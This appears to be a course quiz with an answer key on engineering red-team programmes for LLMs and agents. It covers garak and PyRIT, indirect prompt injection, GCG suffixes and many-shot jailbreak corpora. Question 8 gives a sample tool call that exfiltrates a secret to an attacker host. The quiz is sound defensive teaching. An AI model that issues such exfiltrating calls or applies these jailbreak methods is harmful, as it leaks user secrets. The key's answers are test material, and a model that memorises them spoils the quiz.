# Quiz 01 — LLM and Agent Red-Team Engineering

**Format:** 12 multiple-choice questions · **Open-book.** Use the chapters as reference.

Each question tests a *concept* from the module, not phrasing. The answer key at the bottom cites the chapter the answer comes from.

---

## 1. Chapter 01 names two failure modes an auditor spots on first inspection of a red-team folder: the "event-shaped" programme and the "screenshot-shaped" programme. A team claims they are safe from both because they ran a vendor engagement in Q2 (a deck + 40 screenshots of interesting jailbreaks) and committed the artifacts to the risk-engineering repo. What does chapter 01 say is still wrong?

- A. Nothing — a vendor deck plus screenshots committed to the repo satisfies both failure-mode checks.
- B. Chat transcripts and deck slides are not any of the five artifacts chapter 01 enumerates (target profile, coverage matrix, attack suite, replay bundle, triage log). There is no target profile saying *what was tested*, no coverage matrix saying *how much was claimed*, no runnable suite that would re-fire the findings on the next release, and no triage log with dispositions and register links. The auditor's two questions — "which register row does this cover" and "would it re-fire now" — still have no answer.
- C. The artifacts are fine but should be rotated to a vault after 90 days.
- D. Vendor engagements are inherently non-reproducible and must be replaced with a different engagement model.

## 2. On the coverage matrix (chapter 01), a cell marked `covered:ex03-pyrit-persona-hijack` traces to no row in the mod-102 harm model and no row in the mod-103 register. What does chapter 01 say to do?

- A. Delete the cell — unused.
- B. Leave it; red-team coverage is independent of the harm model.
- C. Either the finding is miscategorised (fix the coverage-matrix cell) or the harm model has a gap (file the gap upstream). Every `covered:*` cell must trace to at least one harm-model row or register row; an untraceable `covered:*` cell is a coverage lie.
- D. Downgrade the cell to `deferred:no-trace` and move on.

## 3. Chapter 01 says harmful payloads do not live in the source repository. A junior engineer argues one harmful payload is small and useful as a test fixture, and proposes committing it with a `# WARNING` comment. What does chapter 01 say is wrong with the proposal, specifically?

- A. The payload is fine as long as the warning comment is present.
- B. The chapter gives four reasons: cloning the repo should never expose a new engineer to CSAM-adjacent, self-harm-inducing, or CBRN-uplift payloads; public mirroring (open-source, forks, backups) should never surface these strings; grep across the codebase should not surface them (many are designed to be persuasive against humans); the strings themselves may violate the code-hosting provider's content policy. A comment does not close any of those. Payloads go in the out-of-repo store; the repo carries hashes and a signed manifest.
- C. The payload is fine for one commit but must be removed from git history within 24 hours.
- D. Payloads may be committed if they are base64-wrapped.

## 4. Chapter 02 insists on *two* garak suites — a per-commit smoke suite and a per-release-candidate full suite. A team proposes running only the full suite on every commit, arguing "one suite is simpler." Per chapter 02, what is the specific objection?

- A. None — a single suite is simpler and acceptable.
- B. The full suite runs hours, not single-digit minutes; it cannot gate every commit without wrecking the per-commit feedback loop. The smoke suite exists because per-commit model / prompt / retriever / tool changes need fast feedback; the full suite exists because the release-gate check needs the full probe library with tuned detectors. Collapsing them either breaks CI timing or under-covers the release gate.
- C. The two suites must use different garak versions.
- D. The smoke suite must use regex detectors only; the full suite must use LLM-judges only.

## 5. A garak run surfaces a candidate from an LLM-judge detector. The reviewer sees the target's response is actually bounded and policy-consistent — the judge over-inferred intent. Per chapter 02, what is the correct disposition path, and whose role owns the methodology for making the judge usable in a release gate?

- A. Mark the row TP and open a mitigation issue; LLM-judge detectors are authoritative.
- B. Mark the row FP and delete the judge. LLM-judges should not be used in a red-team pipeline.
- C. Mark the row FP, add the response to the judge-calibration set, and file the calibration work at the `ai-eval-engineer` (L30) seam — judge-calibration methodology is owned there. In the interim, an uncalibrated judge detector can seed triage (every hit gets a human review) but cannot gate the build on its own.
- D. Mark the row TP but assign severity "minor"; false-positive-prone detectors still produce findings.

## 6. Chapter 03 argues `prompt converter` is a first-class role in PyRIT and that garak folds the equivalent concern into its probe. Why does the chapter say the first-class split matters for an attack library?

- A. It does not matter — the two framings are interchangeable.
- B. First-class converters make converter-chain composition the default: you write one `Base64Converter`, one `TranslationConverter`, one `DanPersonaConverter`, one `GCGSuffixConverter` once, and every future attack that needs one of them composes it in as data rather than re-implementing it in bespoke probe code. Converter-chained variants (encoding + persona, suffix + translation, etc.) become cheap to enumerate — which is the shape multi-turn depth attacks require.
- C. First-class converters are required by the OWASP GenAI Red-Team Guide.
- D. Garak's probes are faster because converters are not first-class; the split exists only for benchmark reasons.

## 7. A team wants to credit a classifier scorer in the release-gate pass rule for a PyRIT attack against a PII-leak objective. The classifier is a stock toxicity / PII model from a public release; no one has measured its precision / recall on the target's actual outputs. Per chapter 03, what is the correct move?

- A. Credit the scorer in the release-gate pass rule; stock classifiers are authoritative.
- B. Credit the scorer, but add a comment noting calibration is pending.
- C. Do not credit the scorer in the pass rule until calibration evidence (precision / recall on a held-out labelled sample from the system's own outputs) is pinned to the scorer's release. Without calibration the scorer's hits can seed triage — every hit gets a human review — but they cannot fail the build on their own. The calibration methodology depth is owned at `ai-eval-engineer` (L30); you consume its outputs.
- D. Replace the classifier with an LLM-judge; LLM-judges are inherently calibrated.

## 8. Chapter 04 names three attack outcomes an indirect-injection suite must cover: unintended tool invocation, data exfiltration through retrieval, and unauthorised action chains. A team's response-side content filter never flags anything suspicious in the agent's text output, so they conclude exfiltration coverage is handled. Per chapter 04, what specific failure mode have they missed?

- A. None — response-side filters are sufficient coverage for exfiltration.
- B. They have missed side-channel exfiltration: the agent's text response to the user is bland, but a tool call (e.g., `HTTP GET https://attacker.example/log?data=<secret>`) encodes the secret in an argument. The response-side detector sees nothing wrong because the exfiltration happens through the tool call, not the response text. The tool-call-side control (destination allow-list, argument sanitisation, egress-pattern blocking) is what has to catch it.
- C. They have missed training-data leakage, which is out of scope for indirect injection.
- D. Response-side filters miss encoding attacks but are fine for exfiltration.

## 9. AgentDojo emits a *pair* per (user task, injection task): **utility** (did the legitimate task complete) and **targeted attack-success-rate** (did the injection succeed). A team reports only the targeted-ASR number from an AgentDojo run against their agent. Per chapter 04, what does the chapter say they are hiding?

- A. Nothing — targeted-ASR is the only metric that matters.
- B. They are hiding the utility number. The chapter calls out explicitly that both numbers matter: a "safe" agent that fails the legitimate user task is not shippable, and an agent that reliably completes the user task while also being reliably manipulable is "exactly the profile that ships and later becomes an incident." Reporting only ASR without utility makes it impossible to tell which of those two profiles the agent is in.
- C. They are hiding the latency distribution.
- D. They are hiding the token-cost distribution.

## 10. Chapter 05 says GCG-style adversarial suffixes need *two* levels of coverage against targets a programme owns. A team ships a pinned replay set of suffixes from the Zou et al. paper's appendix against a closed-API model and calls the GCG row covered. Per chapter 05, when is that enough, and when is it not?

- A. It is always enough; replay of published suffixes is full coverage.
- B. For a closed-API target, replay is the only level available (no gradients). For any open-weight target the programme deploys, the chapter requires a second level: fresh optimisation of GCG against the current checkpoint on a quarterly cadence, because providers retrain against known suffixes and transferred / published suffixes have half-lives. A "GCG covered" cell whose only artifact is replay against a model the provider has since retrained is a stale-suffix programme — the class is not covered, one dead instance of it is.
- C. Replay is enough as long as the suffixes are rotated weekly.
- D. GCG coverage should always use fresh optimisation; replay is never acceptable.

## 11. Chapter 05 warns many-shot payloads carry a discipline wrinkle beyond the GCG rules. Specifically, why does the chapter say the demonstration corpus itself is a harmful artifact?

- A. It is not — demonstrations are just example prompts.
- B. Each demonstration is a `(policy-negative ask, model-would-comply response)` pair; the response side of each pair is itself an example of the model producing harmful content. The *whole corpus* is a library of harmful outputs, authored or curated by someone. The out-of-repo discipline from chapter 01 applies, plus two additions the chapter names: per-demonstration review under the same access controls as other red-team payloads, and length-aware storage that can carry very large corpora without becoming the bottleneck.
- C. The corpus is only harmful if the model is deployed with a large context window.
- D. The corpus is fine in-repo as long as the asks are redacted.

## 12. Chapter 06 names three reference eval-sets: HarmBench, AIR-Bench 2024, and the policy-derived internal suite. A reviewer asks "why not just use HarmBench — it has a leaderboard." Per chapter 06, what distinct role does each set play, and where does the boundary with `ai-eval-engineer` (L30) sit?

- A. HarmBench is sufficient; AIR-Bench and the internal suite are redundant decoration.
- B. HarmBench is a *behaviour-level* benchmark (fixed harmful-behaviour list, published leaderboards, HarmBench-classifier scoring) that gives comparability to published numbers. AIR-Bench 2024 is a *policy-category-level* benchmark (hierarchy derived from EU AI Act, US EO, platform policies) that gives regulation-linked numbers you can present to a regulatory audience. The internal suite closes the gap that neither public benchmark can — categories specific to *your* AUP, tool-use policy, and jurisdiction carve-outs. The three are complementary, not interchangeable. The `ai-eval-engineer` (L30) peer owns the statistical framing (CIs on ASR, judge-calibration, agreement metrics) that wraps whatever numbers these three sets produce; you produce the numbers, they wrap them.
- C. AIR-Bench 2024 replaces HarmBench; only one is needed.
- D. The three are interchangeable; pick whichever the regulator prefers.

---

## Answer key

1. **B.** Chapter 01, "Motivation" (event-shaped vs screenshot-shaped failure modes) and "The five artifacts a shippable programme carries": a programme without target profile, coverage matrix, attack suite, replay bundle, and triage log fails both auditor questions regardless of what decks and screenshots are committed. The five artifacts are what make the programme reproducible and tied to the register.
2. **C.** Chapter 01, "The coverage matrix" and the cross-cutting rule picked up in exercise 01: every `covered:*` cell traces to at least one mod-102 harm-model row or mod-103 register row; the trace is recorded in a footnote; untraceable cells are either miscategorised or reveal a harm-model gap that is filed upstream.
3. **B.** Chapter 01, "Harmful-payload hosting — out of the repo": the four reasons given are cloning exposure (CSAM-adjacent, self-harm, CBRN-uplift), public-mirror surfaces (open-source, forks, backups), grep surfaces (payloads are often persuasive against humans), and code-hosting-provider content-policy risk. The practical shape is out-of-repo payloads with in-repo hashes and a signed manifest.
4. **B.** Chapter 02, "Wiring garak into CI": "The smoke suite is not the release-gate suite. Smoke runs in single-digit minutes to give per-commit feedback. The release-gate suite runs the full probe library with tuned detectors and takes hours; it belongs in a nightly / per-RC pipeline, not per-commit." Collapsing the two either breaks CI timing or under-covers the release gate.
5. **C.** Chapter 02, "What a detector decides" and "Triage — Step 2 — false-positive review", plus chapter 06's "Boundary with `ai-eval-engineer` (peer, level 30)": LLM-judge over-inference is a known failure mode; mark FP, feed the response to the judge-calibration set, file calibration at the L30 seam. Uncalibrated judges can seed triage but cannot gate the build on their own.
6. **B.** Chapter 03, "PyRIT's building blocks" and "Converter-chained": first-class converters make the composition the default authoring pattern; a converter written once is available to every future attack; converter-chained variants (encoding + persona, suffix + translation, DAN + base64) become cheap to enumerate, which is what the converter-chained strategy family exists to express and what garak's probe model does not model well.
7. **C.** Chapter 03, "Scorers — the load-bearing decision": "every scorer credited in the release-gate pass rule has calibration evidence pinned to its release"; for classifiers that is precision / recall on a held-out sample from your system's actual outputs. Uncalibrated scorers seed triage but do not fail the build. Calibration methodology depth is L30 territory (chapter 06's L30 boundary).
8. **B.** Chapter 04, "Data exfiltration through retrieval — Side-channel exfiltration": the response the user sees is bland; the exfiltration rides a tool-call argument. The response-side detector sees nothing wrong by design; the tool-call-side controls (destination allow-listing, argument sanitisation, egress-pattern blocking) are what close it.
9. **B.** Chapter 04, "AgentDojo as the tool-abuse environment": "Both matter — a 'safe' agent that fails the user task is not shippable, and an agent that reliably completes the user task while also being reliably manipulable is exactly the profile that ships and later becomes an incident." Reporting only ASR hides which profile the agent is in.
10. **B.** Chapter 05, "The engineering shape of GCG coverage": Level 1 is replay of published suffixes (available against any target including closed-API models); Level 2 is fresh optimisation against open-weight targets you deploy, on a quarterly cadence, because suffixes have half-lives as providers retrain. A "GCG covered" cell whose only artifact is dead replay is the "stale-suffix programme" failure mode the chapter opens with.
11. **B.** Chapter 05, "Many-shot in-context — Why many-shot is different" and "Many-shot payload discipline": each demonstration is a `(policy-negative ask, model-would-comply response)` pair, so the response side is itself a harmful-content example; the whole corpus is a library of such outputs. The chapter adds per-demonstration review and length-aware storage to the baseline out-of-repo discipline.
12. **B.** Chapter 06, "HarmBench", "AIR-Bench 2024", "The policy-derived internal suite" (role split), and "Boundary with `ai-eval-engineer` (peer, level 30)" (methodology ownership): the three reference sets are complementary (behaviour-level comparability; policy-category regulation linkage; organisation-specific coverage); L30 owns the statistical framing that wraps the numbers the three sets produce.
